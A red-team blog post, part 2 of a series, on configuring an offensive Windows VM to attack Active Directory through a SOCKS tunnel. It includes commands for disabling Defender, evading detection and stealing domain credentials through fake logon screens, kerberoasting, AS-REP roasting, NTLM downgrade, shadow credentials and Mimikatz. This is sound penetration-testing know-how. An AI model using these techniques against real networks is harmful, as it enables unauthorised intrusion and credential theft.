---
layout: post
title:  "Living Off the Foreign Land - Part 2/3: Configuring the Offensive Windows VM"
date:   2023-08-15 01:00:00
excerpt: "Living Off the Foreign Land (LOFL) allows attackers to use Windows' built-in powerful tooling (LOFLCABs) to attack remote systems. The second part in this 3-part article discusses how to configure the Offensive Windows VM so it can use Kerberos authentication with the target network, and also how to obtain various types of credentials and them use them from the Offensive Windows VM."
categories: windows living-off-the-foreign-land active-directory powershell
permalink: /living-off-the-foreign-land-windows-as-offensive-platform-part-2
---

*[FQDN]: Fully Qualified Domain Name
*[LOFL]: Living Off the Foreign Land
*[LOFLCAB]: Living Off the Foreign Land Cmdlets and Binaries
*[LOFLCABs]: Living Off the Foreign Land Cmdlets and Binaries
*[LOFLBin]: Living Off the Foreign Land Binary
*[LOFLCmdlet]: Living Off the Foreign Land Cmdlet
*[OPSEC]: Operational Security
*[CIFS]: Common Internet File System
*[LDAP]: Lightweight Directory Access Protocol
*[CLDAP]: Connectionless LDAP
*[LDAPS]: LDAP over TLS/SSL
*[MMC]: Microsoft Management Console


# Introduction
In [part 1 of this article](/living-off-the-foreign-land-windows-as-offensive-platform), the Linux VM has been configured for SOCKS routing. In this part the configuration of the Offensive Windows VM will be discussed. Moreover, after configuring the Offensive Windows VM, the various ways of collecting different types of credentials from the victim system and using them from the Offensive Windows VM will be discussed.


# Offensive setup: Offensive Windows VM
Now the Linux routing VM is setup, it is time to prepare the Offensive Windows VM which will be connected to the second interface of the Linux routing VM.

## Client vs Server Windows
Windows provides two types of operating systems: client and server. For the purpose of LOFL, in the majority of the cases a client Windows operating system like Windows 10 or Windows 11 without any domain configured works excellent. In some cases however, certain tools are only available on Windows Server, or require the current system to be part of a domain, which can be any domain. For those instances it can be relevant to have a so-called Offensive DC; a Windows Server which is running the Active Directory Domain Services role and a domain set up. At the LOFL-Project website these are listed when filtering for the [Server toolset](https://lofl-project.github.io/#+server).

The [Windows Server to Workstation website](https://www.windowsworkstation.com/win2016-2019/)[^2] which I founded in 2008 and in 2017 handed over to Paul Rowland (@pauljrowland) provides instructions how to configure the Windows Server OS in such a way that it feels like a regular workstation. In my personal setup I am using a Windows 10 VM, and for the few occasions that I need an Offensive DC, I have a Windows Server 2019 VM.

## Obtaining a Windows VM
A Windows VM can either be created from scratch using the Windows installation ISO or a pre-built clean Windows VM can be used. Moreover, scripts can be used to automatically install various security tools.

The Windows 10/11 and Windows Server 2019/2022 ISOs and VMs provided by Microsoft can be obtained from the following links.

| **Version**         | **Type** | **Link**                                                                    | **Notes**                                                         |
|---------------------|----------|-----------------------------------------------------------------------------|-------------------------------------------------------------------|
| Windows 10          | ISO      | <https://www.microsoft.com/en-us/software-download/windows10>               | Visit from non-Windows OS to be able to directly download the ISO |
| Windows Server 2019 | ISO/VM   | <https://www.microsoft.com/en-us/evalcenter/download-windows-server-2019>   |                                                                   |
| Windows 11          | VM       | <https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/> |                                                                   |
| Windows Server 2022 | ISO/VM   | <https://www.microsoft.com/en-us/evalcenter/download-windows-server-2022>   |                                                                   |

Once the clean Windows is booted, repositories like Mandiant's Commando or FLARE VMs could be used to automatically install various security tools. Consider this an optional step however, as in the next paragraphs the tools and configuration required for the Offensive Windows VM will be discussed in detail.

| **Name**    | **OS**  | **Link**                                  | **Notes**                                                                                                                        |
|-------------|---------|-------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------|
| Commando VM | Windows | <https://github.com/mandiant/commando-vm> | List of tools that are installed available at <https://github.com/mandiant/commando-vm/blob/master/packages.csv>                 |
| FLARE VM    | Windows | <https://github.com/mandiant/flare-vm>    | This repository is primarily focused on reverse engineering, but also contains various tools that are relevant for offensive use |

## Network
Make sure the network interface of the Offensive Windows VM is connected to the network segment to which the second network interface of the Linux routing VM is connected. In case in the previous section the DHCP server has been configured, the Offensive Windows VM should automatically obtain an IP address from the Linux routing VM. If the DHCP server has not been configured, it is also possible to manually set the IP configuration of the Offensive Windows VM where both the Linux and Windows VMs must have IP addresses in the same subnet, and both the gateway and DNS server of the Offensive Windows VM need to be set to the IP address of the Linux routing VM.

## Disabling Windows Defender
An important step before installing additional software on the Offensive Windows VM is to get rid of the Windows Defender antivirus as it will interfere with the hacker tools like Mimikatz that will be installed on the Offensive Windows VM. Very clear step by step instructions to disable Windows Defender can be found in the `README.md` of the [Commando-VM repository](https://github.com/mandiant/commando-vm#pre-install-procedures)[^3]. For easier execution, a simple PowerShell script which automates most of these steps can be found in the [LOFL repository](https://github.com/bitsadmin/lofl)[^1]: `DisableWindowsDefender.ps1`.

## Install tools
In addition to all the LOFLCABs Windows has already built in, some additional LOFLCABs and prerequisites need to be installed for the Offensive Windows VM to be ready.

First of all, Windows' Remote Server Administration Tools (RSAT) contains various useful PowerShell modules, binaries and MMC snap-ins. This toolkit can be installed from an elevated PowerShell prompt using the following command-line which differs between the client and server versions of the OS.

| **OS** | **Command-line**                                                             |
|--------|------------------------------------------------------------------------------|
| Client | `Get-WindowsCapability -Online -Name Rsat.* | Add-WindowsCapability -Online` |
| Server | `Install-WindowsFeature RSAT -IncludeAllSubFeature`                            |

Next, to be able to prepare credential material to be used over the SOCKS tunnel, the excellent tools [Mimikatz](https://github.com/gentilkiwi/mimikatz)[^4] and [Rubeus](https://github.com/GhostPack/Rubeus)[^5] by respectively Benjamin Delpy (@gentilkiwi) and Will Schroeder (@harmj0y) are required. These can be obtained from the following URLs.

| **Tool** | **Link**                                 | **Notes**                                                             |
|----------|------------------------------------------|-----------------------------------------------------------------------|
| Mimikatz | <https://github.com/gentilkiwi/mimikatz> | Binaries available at the Releases page                               |
| Rubeus   | <https://github.com/GhostPack/Rubeus>    | No binaries are available, so it needs to be compiled from the source |

Finally, the Sysinternals tools[^6], which should be present on every Windows system and includes several LOFLBins, should be installed. The Sysinternals Suite which contains all Sysinternals binaries can be obtained from <https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite>.

In my setup I have dropped the binaries of the Mimikatz and Rubeus in the `C:\Tools` folder, and the Sysinternals tools as a subfolder of `C:\Tools`. Moreover, I added both the `C:\Tools` and `C:\Tools\Sysinternals` folders in the system-wide `PATH` environment variable, so no explicit path is required to invoke these tools.

## Configuration
The configuration of the Offensive Windows VM consists of two parts. The first part is the general configuration which makes Windows more willing and capable of using Kerberos authentication to foreign domains. The second part is the configuration that is required per target domain, which will be discussed in the next section.

### Connection profile
From an elevated PowerShell, set the connection profile of the network interface which is connected to the Linux routing VM to private.

```powershell
# View current settings
Get-NetConnectionProfile

# Set connection profile to Private
Set-NetConnectionProfile -InterfaceAlias "Ethernet" -NetworkCategory Private

# Validate settings
Get-NetConnectionProfile
```

### WinRM
Configure WinRM to trust all remote hosts, allowing WinRM to use Kerberos authentication against remote systems.

```powershell
Set-Item -Path WSMan:\localhost\Client\TrustedHosts -Value * -Force
Restart-Service WinRM
```

Alternatively, instead of using the asterisk (`*`) also specifically certain domains (`*.ad.bitsadmin.com`) or specific hosts (`W10.ad.bitsadmin.com,W11.ad.bitsadmin.com`) can be specified, however because this is the attacker system, the easiest is just to allow usage of Kerberos against any host.

### Browsers
Because Internet Explorer is deprecated, Microsoft is actively pushing users to migrate to Microsoft Edge. In some occasions however, it is still useful to be able to use Internet Explorer, so this has to be configured. Depending on which browser is used in the target organization, for OPSEC reasons a browser like Google Chrome should be installed. Chromium-based browsers like Microsoft Edge and Google Chrome do not spawn their processes under the process that launched the browser, which results in credential material not being inherited (more about that in a later section). For that reason some settings need to be altered.

| **Browser**       | **Command-line**                                                     | **Notes**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
|-------------------|----------------------------------------------------------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Internet Explorer | `"C:\Program Files\Internet Explorer\iexplore.exe"`                    | Nowadays because Microsoft Edge is pushed, it is required to disable the IEToEdge Browser Helper Object (BHO). This can be done using the following command-line: `reg.exe add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Ext\CLSID /T REG_SZ /V {1FD49718-1D00-4B19-AF5F-070AF6D5D54C} /D 0 /F`. If for some reason Internet Explorer is still not allowed to launch, an effective way to allow it to launch is to delete the `ie_to_edge_bho*.dll` files from disk. For these and more options, check <https://www.winhelponline.com/blog/disable-auto-redirect-unsupported-sites-ie-to-edge/> |
| Microsoft Edge    | `"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"`       | Navigate to Settings -\> System and performance -\> and disable "Startup boost" and "Continue running background extensions and apps when Microsoft Edge is closed"                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
| Google Chrome     | `"C:\Program Files\Google\Chrome\Application\chrome.exe" --no-sandbox` | When used, `chrome.exe` needs to be launched with the `--no-sandbox` parameter                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |

### Disable fallback to NTLM
This is an optional setting which might prevent accessing some resources in the target domain, however for OPSEC purposes it is recommended to disable fallback to NTLM authentication whenever Kerberos authentication fails. This setting can be configured through the GUI or by setting a registry key and is immediately active once modified. For that reason it is also easy to have it off by default, but when consciously decided that NTLM authentication can be used for a certain activity, it can be temporarily enabled.

To configure this setting through the GUI, launch gpedit.msc and navigate to Computer Configuration -\> Windows Settings -\> Security Settings -\> Local Policies -\> Security Options. Open the "Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers" setting and set it to "Deny All".

Alternatively, this setting can also be configured in the registry using PowerShell. The possible values for this setting are: `0` - Allow All; `1` - Audit All; `2` - Deny All.

```powershell
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0 -Name RestrictSendingNTLMTraffic -Value 2 -Force
```

Now the general configuration of the Offensive Windows VM is done, the next step is to configure the domain-specific settings, first for the Linux routing VM and next for the Offensive Windows VM.

[^1]: <https://github.com/bitsadmin/lofl>
[^2]: <https://www.windowsworkstation.com/win2016-2019/>
[^3]: <https://github.com/mandiant/commando-vm#pre-install-procedures>
[^4]: <https://github.com/gentilkiwi/mimikatz>
[^5]: <https://github.com/GhostPack/Rubeus>
[^6]: <https://learn.microsoft.com/en-us/sysinternals/>


# Linux routing VM: configuration per domain
Even though most of the configuration needs to be done on Windows, there are three actions that will need to be performed when a new domain needs to be accessed from the Offensive Windows VM.

## DNS
Add any domains that are discovered to the `/etc/dnsmasq.conf` file as follows. After updating the config, make sure to restart both the `dnsmasq` service and the `dns_over_tcp.py` script.
```ini
server=/ad.bitsadmin.com/10.0.10.10
server=/ad.bitsadmin.com/10.0.10.11
server=/10.0.10.in-addr.arpa/10.0.10.10
server=/10.0.10.in-addr.arpa/10.0.10.11
```

## Routes
Depending on which routes are already configured to go over tun2socks, it might be required to add additional routes to reach the additional domains that have been added. These routes can be added as follows.
```bash
ip route add 10.0.10.0/24 via 198.18.0.1 dev tun1
```

## CLDAP
One utility that is required to launch for every domain is `cldaproxy.sh`, also available from the [LOFL repository](https://github.com/bitsadmin/lofl)[^1]. CLDAP stands for Connectionless LDAP which is LDAP communication over port `389/UDP` (as opposed to `389/TCP` in case of LDAP). Even though it is possible to reduce the use by Windows of CLDAP which will be discussed in the next section, in some occasions Windows still makes use of it. Because the CLDAP protocol (UDP) is exactly the same as the LDAP protocol (TCP), it is easy using iptables to intercept any CLDAP traffic coming from the Windows host, using socat converting it to LDAP traffic, and for any answers perform the reverse process. The command-line parameters are as follows.

```
CLDAProxy v1.0
@bitsadmin - https://github.com/bitsadmin/lofl

Convert CLDAP (UDP) traffic to LDAP (TCP)

Usage: cldaproxy.sh <domain> [dc_ip]

Parameters:
  domain:    Domain name to resolve and use to proxy to
  dc_ip:     Use explicit server IP instead of deriving it from the domain

Examples:
  Proxy CLDAP to LDAP for domain ad.bitsadmin.com
  cldaproxy.sh ad.bitsadmin.com

  Proxy CLDAP to LDAP making use of DC 10.0.10.10
  cldaproxy.sh ad.bitsadmin.com 10.0.10.10
```

# Offensive Windows VM: configuration per domain
The second part of the configuration of the Offensive Windows VM consists of modifications to make the Offensive Windows VM which resides outside of the target domain, blend in with the hosts in the domain. Part of blending in is to make sure that like all hosts that are part of the domain Kerberos authentication is used as opposed to NTLM authentication. To accomplish this, it is required for the Windows VM to trust the target domain and because of that is willing to use its (Kerberos) credential material.

## Host
In logs of systems where the Offensive Windows VM will be communicating with, regularly the computer name and in some cases even the internal (!) IP address of the Offensive Windows VM, meaning the IP address used between the Linux routing VM and Offensive Windows VM, is being logged. To keep maximum OPSEC, it is useful for the Offensive Windows VM to blend in with the hostnames and maybe even IP addresses used in the target organization. The computer name of the Offensive Windows VM can simply be changed in the computer settings, which subsequentially requires a reboot to be applied. To update the IP configuration, the IP address of the Linux routing VM needs to be updated and in case the DHCP server is used, these ranges need to be updated. For detailed instructions, refer to the [Offensive setup: Linux routing VM](/living-off-the-foreign-land-windows-as-offensive-platform#offensive-setup-linux-routing-vm) section in part 1. After updating the configuration, make sure to restart the dnsmasq service and refresh the IP configuration on Windows.

## CLDAP
As mentioned before, in addition to running the `cldaproxy.sh` utility, it is possible to configure Windows reduce the use of Connectionless LDAP (CLDAP). This can be done using Windows' `ksetup.exe` command-line utility. For every domain to be accessed the following command-line can be executed where `AD.BITSADMIN.COM` (ksetup prefers upper casing) is the target domain.
```powershell
ksetup.exe /SetRealmFlags AD.BITSADMIN.COM tcpsupported
```

## Certificates
Trust in Active Directory quite extensively depends on whether the certificates presented are trusted on the local system. In other words, the Offensive Windows VM needs to have the certificate authorities of the target domain in its local Trusted Root Certification Authorities list. There are myriad ways to obtain the certificates (`.crt`) of the target domain which are discussed in the upcoming paragraphs. It might be that this section causes a bit of a chicken-egg problem as the Offensive Windows VM should already be used for these scripts while currently it is still being set up. In that case the best approach is to just work through the remainder of the article up to the Living off the Foreign Land section starting in part 3, and then return here to configure the certificates.

**Option \#1: Enterprise NTAuth store through LDAP**

One option is to obtain the root certificates through LDAP which can be done through both PowerShell as well as Sysinternals ADExplorer. To collect the root certificates through PowerShell, the following code can be used where the `$domain` and `$dc` variable need to be updated to match the target domain and domain controller. The `.crt` files will be written to PowerShell's current directory.

```powershell
$domain = 'ad.bitsadmin.com'
$server = 'DC1.ad.bitsadmin.com'
$ldapdcstr = 'DC=' + (($domain.Split('.')) -join ',DC=')
$certs = (Get-ADObject -SearchBase "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,$ldapdcstr" -Filter * -Properties cACertificate -Server $server).cACertificate
$certs | ForEach-Object {
    $c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
    $c.Import($_)
    $c
    [System.IO.File]::WriteAllBytes("$pwd\$($c.DnsNameList[0].Unicode).crt", $_)
}
```

An alternative to using PowerShell to obtain the certificates is to use Sysinternals ADExplorer or another LDAP client. Navigate to the following path, where the domain components (`DC=`) are those of the target environment.

```
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ad,DC=bitsadmin,DC=com
```

Next, store the value of the `cACertificate` attribute in a text file (`certs.txt`). In case of ADExplorer, these are lines with space-separated integers representing bytes where each certificate is separated by a newline. The following Python3 snippet can be used to turn the `certs.txt` file into `.crt` files.

```python
with open('certs.txt', 'r') as f:
    certs = f.read()

i = 1
for cert in certs.split('\n'):
    certbin = bytes([int(c) for c in cert.split(' ')])
    with open('%i.crt' % i, 'wb') as f:
        f.write(certbin)
    i += 1
```

**Option \#2: Enterprise NTAuth store on victim system**

The Enterprise NTAuth store is also stored on systems in the domain, like possibly a victim system that is under our control. The following PowerShell snippet illustrates how to extract the root certificates from the registry and store them as `.crt` files in the working directory.

```powershell
$certs = Get-ChildItem HKLM:\SOFTWARE\Microsoft\EnterpriseCertificates\NTAuth\Certificates
$certs | ForEach-Object {
    $d = $_ | Get-ItemPropertyValue -Name Blob
    $c = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 -ArgumentList $d, ''
    $c
    $b = $c.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Cert)
    [System.IO.File]::WriteAllBytes("$pwd\$($c.DnsNameList[0].Unicode).crt", $b)
}
```

**Option \#3: Certificate chain of TLS port**

Whenever a service running on a TLS port in the domain is using properly signed certificates, it is possible to extract the certificates from the TLS handshake using for example PowerShell. An example of a TLS port which is relevant for this purpose is the LDAPS port of one of the domain controllers. The `CollectCerts.ps1` script in the [LOFL repository](https://github.com/bitsadmin/lofl)[^1] can aid in connecting to such TLS port and extracting the certificates. The script requires the name of the host to connect to (e.g., `DC1.ad.bitsadmin.com`) and optionally a port (default is `636/TCP`). The certificates will be stored to the current working directory.

When a webserver running on a TLS port has been identified, it is also easy to simply visit the webpage in a browser, view the certificate details and use the browser's functionality to store the certificates on disk. A final option is to connect to a TLS port with whatever tool works (e.g. the openssl client) while Wireshark is listening on the network interface, and then extracting the certificate(s) from the Server Hello message.

**Option \#4: Certificate Enrollment**

On the domain controllers `\\ad.bitsadmin.com\CertEnroll` or otherwise the certificate authority servers exists a share called `CertEnroll`. Among other files, this share hosts a certificate (`.crt`) with the certificate chain.

**Importing**

Once the root certificates have been obtained through any of the above approaches, the next step is to open the Local Computer Certificates (`certlm.msc`), navigate to Trusted Root Certification Authorities, right click Certificates and in the **All Tasks** menu select **Import**. In the wizard, select the `.crt` file obtained through one of the options discussed before and repeat this for all of the `.crt` files obtained.

## Local intranet zones
To allow for automatic (Kerberos) authentication against websites (including WebDAV) in the target domain, the Offensive Windows VM needs to trust the hostname to send its authentication information to it. To accomplish this, open the Internet Options control panel applet (`inetcpl.cpl`) and navigate to the **Security** tab (also directly accessible through `inetcpl.cpl ,1`). Next, select the **Local intranet zone** and click **Sites** and in the **Local intranet** popup, choose **Advanced**. Finally, add the target domains to the list of sites in the zone, one at a time, e.g. `*.ad.bitsadmin.com`, `*.corp.int` and `*.research.dev`.

## WebDAV
Another setting required for smooth authentication to WebDAV is the `AuthForwardServerList` setting in the parameters for the WebClient service. This is relevant to configure in case Kerberos authentication is required for WebDAV shares. The following PowerShell lines show how different domains can be added. The WebClient service needs to be restarted for the configuration to be active.

```powershell
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\WebClient\Parameters -Name AuthForwardServerList -PropertyType MultiString -Value '*.ad.bitsadmin.com','*.corp.int','*.research.dev'
Restart-Service WebClient
```

## Summary
The Offensive Windows VM has now been configured to accept interaction with and authentication to the target domain.

Now both the Linux router VM and Offensive Windows VM have been configured, a visual of how the setup looks like and works. Assuming that credential material is in place (to be discussed in the upcoming sections), the diagram illustrates three distinct connection flows:

1. A share listing is requested of the `BAK1.ad.bitsadmin.com` server:
    * A DNS request (UDP) is performed to obtain the IP address of the `BAK1` server, this DNS request is converted to TCP and sent over the SOCKS tunnel to the `DC1` which then returns the IP address (`10.0.10.62`);
    * The `net.exe` command-line utility connects to port `445/TCP` of the `BAK1` server and obtains the share listing;
2. The Burp application is launched: example of a tool that is often used for offensive purposes and whose DNS request for the portswigger.net domain and connection to it should for OPSEC reasons not go through the target environment;
3. A CLDAP query is performed: Example of a CLDAP connection which using the `cldaproxy.sh` utility is converted to a regular LDAP connection.

![Detailed setup](/assets/img/20230815_living-off-the-foreign-land/DetailedSetup.png "Detailed setup")

Now the Offensive Windows VM has been configured to accept interaction with the target domain, the next sections will discuss how to obtain credential material to be used to authenticate to the domain from the Offensive Windows VM.


# Obtaining credential material
A disadvantage of attacking a target network over SOCKS as opposed to using a software implant is the authentication. Authentication when executing code in a software implant most of the time happens transparently while in case the Offensive Windows VM is challenged for authentication, it does not have any credential material available. This section will discuss the different ways to obtain credential material through the software implant where unless specified differently, these can be performed as a low-privileged user. The types of credential materials that will be discussed are plaintext, Kerberos TGT/TGS, certificate and hash. All the tools mentioned are .NET assemblies which are supported by most C2 framework to be executed in the memory of the software implant.

## Plaintext
The most straight-forward credentials to at least use are a plaintext domain username and password. At a red team engagement such credentials can be received as part of an assumed compromise scenario where the attacker receives the same credentials and equipment as a regular employee would receive when they are onboarded.

**Social engineering**

An alternative approach which attempts to social engineer the user into typing his or her credentials is to make use of fake credential prompts. One of such examples is the [FakeLogonScreen](https://github.com/bitsadmin/fakelogonscreen)[^7] tool I wrote a while ago which imitates the Windows lock screen while putting all additionally connected screens to black. Once the user enters their credentials, the credentials are first validated, and if they are correct, the screen disappears and the user can proceed with their work. In the background the attacker can read the credentials that are being typed from the console of the implant.

Another tool is [SharpLoginPrompt](https://github.com/shantanu561993/SharpLoginPrompt)[^8] by Shantanu Khandelwal (@shantanukhande) which poses a fake Windows authentication prompt to the user, requesting the user to enter his or her credentials. Again, the credentials entered by the user are displayed at the console of the implant.

**Create computer account**

The domain account to be used from the Offensive Windows VM does not need to be account of the user which is running the software implant, nor does it even need to be a user account. By default Active Directory allows any domain user to create 10 computer accounts (this count is set in the `ms-DS-MachineAccountQuota` Active Directory attribute). Because the implant is running under the user's session, it is probably able to create such new computer account where both the computer name and password can be specified by the attacker. An example of a tool which provides the functionality to create a new computer account is [StandIn](https://github.com/FuzzySecurity/StandIn)[^9] by Ruben Boonen (@FuzzySec). The following command will create a new computer account and display the password which is automatically generated by the tool in the output. Alternatively a password can be provided using the `--pass` parameter.

```
beacon> bofnet_executeassembly StandIn --computer DESKTOP-B1T54DM --make
[*] Attempting to start .NET assembly in blocking mode
[+] host called home, sent: 10005 bytes
[+] received output:

[?] Using DC    : DC1.ad.bitsadmin.com
    |_ Domain   : ad.bitsadmin.com
    |_ DN       : CN=DESKTOP-B1T54DM,CN=Computers,DC=ad,DC=bitsadmin,DC=com
    |_ Password : zSMhVdxWCxhGNsW

[+] Machine account added to AD..
```

**Internal monologue**

Internal monologue is an attack discovered by Elad Shamir (@elad_shamir). In this attack, an interaction is performed with Windows' NTLM Security Support Provider (SSP) to calculate a NetNTLM response in the context of the current user. The NetNTLM response can subsequentially be cracked offline by the attacker and depending on the password strength, the plaintext password can be recovered. To increase the chances of success, the NetNTLMv2 protocol can also be downgraded to a NetNTLMv1 by modifying some values in the registry. This however requires the software implant to be running under a user that has local administrative privileges and additionally might result in alerts of the security software running on the system.

A tool which is able to perform this attack is [Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)[^10] which is simply executed without parameters: `InternalMonologue`. Optionally a downgrade to the more easily crackable NetNTLMv1 can be forced by adding the `-Downgrade True` parameter.

**DPAPI masterkeys**

DPAPI is the data protection API of Windows. This API takes care of securely storing and retrieving secrets in Windows. The way DPAPI works is that the files in which the secrets are stored on disk are encrypted with a master password, which in turn is encrypted with the password of the user. This however also means that when an attacker is able to obtain the file containing the DPAPI master password, an attacker can attempt to crack that file offline to recover the user's password.

A tool which is able to obtain crackable hashes from this masterkey file is [DPAPISnoop](https://github.com/leftp/DPAPISnoop)[^11] by Lefteris Panos (@lefterispan). This tool can simply be executed without parameters (`DPAPISnoop`) and will then display the crackable hash in the console of the implant.

**Kerberoasting**

Kerberoasting is a technique that exploits weaknesses in the Kerberos authentication protocol. Attackers request a Ticket Granting Service (TGS) ticket for specific account which has a Service Principal Name (SPN) associated with them. Because the TGS is encrypted with the password of the account and it is possible to extract the ticket, an attacker can attempt to crack the TGS offline to recover the plaintext password of the account. Moreover, an attacker can attempt to request a TGS that is encrypted using a weaker encryption (RC4) as opposed to stronger (AES) encryptions to speed up the cracking. This might however come at the expense of a worse OPSEC.

A tool which is able to perform a kerberoast is Rubeus[^5]. This kerberoast can either be performed targeted or on a larger scale, where in the latter case multiple accounts are roasted at once. A targeted kerberoast using Rubeus can be performed using `Rubeus kerberoast /user:TargetUser`.

**AS-REP roasting**

Besides kerberoasting there is another technique called AS-REP roasting. This specifical type of roasting is specifically targeted to Active Directory accounts which have the "Do not require Kerberos preauthentication" flag set. This allows an attacker to without authentication request an AS-REP message which is encrypted with the user's password. The attacker can then attempt to crack this AS-REP message offline and if successful, recover the user's plaintext password.

Rubeus is able to perform an AS-REP roast where the command-line is `Rubeus asreproast /user:TargetUser`.

## TGT/TGS
Another way to authenticate to Active Directory is a Ticket Granting Ticket (TGT). In Active Directory, after authenticating to a DC, the DC provides the user with a TGT. Whenever the user subsequentially attempts to authenticate to a machine or service in the domain, the TGT is used to request a Ticket Granting Service (TGS) to the DC, which once received can be used to authenticate to the machine or service.

**TGT delegation**

This technique manipulates Windows to forge an AS-REQ for an SPN which is configured for unconstrained delegation. Once forged, the TGT is carved out of Generic Security Services API (GSS-API) obtaining a TGT for the current user. For example, Rubeus is able to perform this activity using the following command-line: `Rubeus.exe tgtdeleg /nowrap`

**TGS Extraction**

Any TGSs which have been requested in the user's session can be extracted from the system and reused to authenticate against that specific service. Rubeus can be used to first list the TGSs that are available in the current user using Rubeus triage, and subsequentially these tickets can be extracted using `Rubeus dump /nowrap /service:TargetService`.

## Certificate
An alternative type of authentication that can be used in Active Directory are certificates. The use and abuse of certificates and Active Directory Certificate Services (ADCS) has become a very popular escalation vector from the moment in 2021 when Will Schroeder (@harmj0y) and Lee Christensen (@tifkin\_) published their extensive [research on ADCS](https://posts.specterops.io/certified-pre-owned-d95910965cd2)[^12] with the associated [Certify](https://github.com/GhostPack/Certify)[^13] tool.

**Certificate services**

In case ADCS has been configured in the domain and the user has sufficient rights, it might be possible to request a certificate which can be used for authentication. An example of a tool which is able to list the available certificate templates and subsequently request them is Certify.

**Shadow credentials**

One example use case where Active Directory uses certificates is when Windows Hello for Business is used for an endpoint. Enabling this feature transparently generates a certificate pair and stores its public key in the user object in Active Directory. As an attacker is also possible to generate a key pair and add the public key to the account. In the offensive security world this is commonly referred to as a shadow credential.

An example of a tool which is able to add shadow credentials to an account is [Whisker](https://github.com/eladshamir/Whisker)[^14] where the command-line is `Whisker add /target:TargetUser`. Be aware though that generally a low-privileged user might not have sufficient authorizations to write a public key to the `msDS-KeyCredentialLink` attribute of its user object in Active Directory. In case the preconditions are right, an alternative might be to coerce a service on the victim system through a reverse port forward to authenticate to the attacker, and then relay the authentication to add a shadow credential to the computer account in Active Directory. This has a high likelihood of succeeding because the computer account *is* generally able to add a shadow credential to itself. It however goes beyond the scope of this article to describe this attack in detail.

**Shadow credentials \#2**

An alternative to adding shadow credentials to the `msDS-KeyCredentialLink` user object attribute and use the `altSecurityIdentities` attribute instead. A tool which is able to add such shadow credential is [SharpAltSecIds](https://github.com/bugch3ck/SharpAltSecIds)[^15] by Jonas Vestberg (@bugch3ck) of which the command-line is as follows:
```powershell
SharpAltSecIds.exe a /target:TargetUser "/altsecid:X509:<I>DC=com,DC=bitsadmin,DC=ad,CN=LabSubCA1<S>DC=com,DC=bitsadmin,DC=ad,CN=mycert"
```

## Hash
The final type of credential that can be used in Active Directory is a hash. This includes the NTLM (RC4) hash, but also the AES128 and AES256 hash types. Such hashes can be obtained by for example escalating on the initial access host and then using a tool like Mimikatz to get credential information from memory. Another way to obtain an NTLM hash is using Kerberos' PKINIT feature to use certificate authentication (see previous subsection) to obtain the NTLM hash. This hash can be obtained using Dirk Jan's (@dirkjanm) [PKINITtools](https://github.com/dirkjanm/PKINITtools)[^16].

## Conclusion
There are various methods to obtain different types of credential material and sooner or later during an engagement such material will be encountered. Once such credential material is available, it is possible to move away from the victim system and only use it as a network-level stepping stone into the network. For an overview of the various credentials and tools to obtain those, refer to [appendix B](#appendix-b-credential-types-and-tools).

The next section will discuss for the different types of credential materials how to use them from the Offensive Windows VM to authenticate in the domain to obtain a valid Kerberos TGT. This ticket can then be used from the Offensive Windows VM to obtain any subsequent TGSs and perform authentication against the various hosts.

[^7]: <https://github.com/bitsadmin/fakelogonscreen>
[^8]: <https://github.com/shantanu561993/SharpLoginPrompt>
[^9]: <https://github.com/FuzzySecurity/StandIn>
[^10]: <https://github.com/eladshamir/Internal-Monologue>
[^11]: <https://github.com/leftp/DPAPISnoop>
[^12]: <https://posts.specterops.io/certified-pre-owned-d95910965cd2>
[^13]: <https://github.com/GhostPack/Certify>
[^14]: <https://github.com/eladshamir/Whisker>
[^15]: <https://github.com/bugch3ck/SharpAltSecIds>
[^16]: <https://github.com/dirkjanm/PKINITtools>


# Preparing credential material
Before going into preparing the credential material, some background on how logon sessions work in Windows.

## Logon sessions and netonly
A logon session is a computing session that begins when a user authentication is successful and ends when the user logs off of the system. When a user is successfully authenticated, the authentication package creates a logon session and returns information to the Local Security Authority (LSA) that is used to create a token for the new user[^17].

As can be read in the documentation for the `dwLogonFlags` parameter of the `CreateProcessWithLogonW` function[^18], there are two options for the logon. Of these options the `LOGON_NETCREDENTIALS_ONLY` (netonly) option is the one that is used extensively in LOFL. Because the credentials that are being used are not relevant for the local (attacker) machine, it is not possible to launch processes as those locally. The netonly option however allows a process to run under the current user session, however in the background creates a new logon session. This logon session then contains the credential material that has been provided to it, and whenever a network resource challenges for authentication, the authentication package will transparently take care of it.

There are various authentication packages[^19] of which the ones relevant to LOFL are NTLM, Kerberos and Negotiate. The first two authentication packages speak for themselves, whereas the last one attempts to use Kerberos authentication, however if that fails, it falls back on NTLM authentication. As mentioned at the end of the [Offensive setup: Offensive Windows VM](/living-off-the-foreign-land-windows-as-offensive-platform-part-2#offensive-setup-offensive-windows-vm) section, for OPSEC reasons this behavior can be changed, so Windows does not fall back on NTLM and instead just fails. The Negotiate provider is the authentication provider that is used by the different tools discussed in this section.

The various logon sessions that are active on a system can be displayed using Sysinternals' logonsessions[^20] command-line utility, where optionally also the processes that are associated with the various logon sessions can be listed by providing the `-p` parameter. Additionally, the logon id of the logon session to which the current window is associated can be viewed using `klist.exe`.

## Loading credential material
For the different types of credentials different methods are used to place those into memory. Whereas Windows provides a built-in command-line tool to authenticate using plaintext credentials to remote systems, other credentials like certificates, TGTs and hashes require the Rubeus and Mimikatz tooling.

